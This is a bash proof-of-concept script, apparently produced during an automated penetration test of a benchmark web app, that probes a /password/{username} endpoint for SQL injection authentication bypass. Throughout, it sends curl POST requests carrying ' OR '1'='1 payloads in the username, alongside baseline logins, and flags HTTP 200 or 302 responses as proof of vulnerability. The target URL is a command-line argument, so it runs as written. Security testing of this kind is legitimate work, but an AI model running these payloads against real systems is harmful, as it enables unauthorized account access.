#!/bin/bash
# POC: Demonstrates SQL injection in username parameter at /password endpoint bypassing authentication
# Target: ./repo
# Created: 2025-11-04T17:35:58.827Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# SQL Injection Authentication Bypass POC - Version 2
# Targets: POST /password/{username} endpoint
# Vulnerability: Unsanitized username parameter in SQL query

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] SQL Injection Authentication Bypass POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Normal login with valid credentials (baseline)
echo "[TEST 1] Normal login with valid credentials (baseline)"
echo "Testing: POST /password/test with password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/test" \
  -d "password=test" \
  -i)

echo "$RESPONSE" | head -20
echo ""
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
echo "HTTP Response Code: $HTTP_CODE"
echo ""

# Test 2: SQL Injection - OR 1=1 bypass attempt
echo "[TEST 2] SQL Injection with OR 1=1 clause"
echo "Testing: POST /password/' OR '1'='1 with password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/' OR '1'='1" \
  -d "password=test" \
  -i)

echo "$RESPONSE" | head -20
echo ""
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
echo "HTTP Response Code: $HTTP_CODE"
if [[ "$HTTP_CODE" == "302" ]] || [[ "$HTTP_CODE" == "200" ]]; then
  echo "[+] POTENTIALLY VULNERABLE: Accepted SQL injection payload"
fi
echo ""

# Test 3: Invalid username baseline
echo "[TEST 3] Invalid username (baseline - should fail)"
echo "Testing: POST /password/nonexistentuser123 with password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/nonexistentuser123" \
  -d "password=test" \
  -i)

echo "$RESPONSE" | head -20
echo ""
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
echo "HTTP Response Code: $HTTP_CODE"
echo ""

# Test 4: SQL Injection with invalid username
echo "[TEST 4] SQL Injection with invalid username"
echo "Testing: POST /password/invaliduser' OR '1'='1 with password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/invaliduser' OR '1'='1" \
  -d "password=test" \
  -i)

echo "$RESPONSE" | head -20
echo ""
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
echo "HTTP Response Code: $HTTP_CODE"

if [[ "$HTTP_CODE" == "302" ]] || [[ "$HTTP_CODE" == "200" ]]; then
  echo "[+++] CONFIRMED VULNERABLE: Non-existent user + SQL injection succeeded!"
  echo "[+++] This proves SQL injection bypasses username validation"
fi
echo ""

# Test 5: Wrong password with normal username (baseline)
echo "[TEST 5] Wrong password with normal username (should fail)"
echo "Testing: POST /password/test with password=wrongpassword"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/test" \
  -d "password=wrongpassword" \
  -i)

echo "$RESPONSE" | head -20
echo ""
echo ""

# Test 6: SQL injection with wrong password
echo "[TEST 6] SQL Injection with wrong password"
echo "Testing: POST /password/' OR '1'='1 with password=wrongpassword"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/' OR '1'='1" \
  -d "password=wrongpassword" \
  -i)

echo "$RESPONSE" | head -20
echo ""
HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
BODY=$(echo "$RESPONSE" | tail -20)

if echo "$BODY" | grep -iq "incorrect\|wrong\|invalid password"; then
  echo "[+] CONFIRMED: Password parameter is still validated"
  echo "[+] This shows injection affects WHERE clause without full query takeover"
fi
echo ""

echo "[*] POC Complete"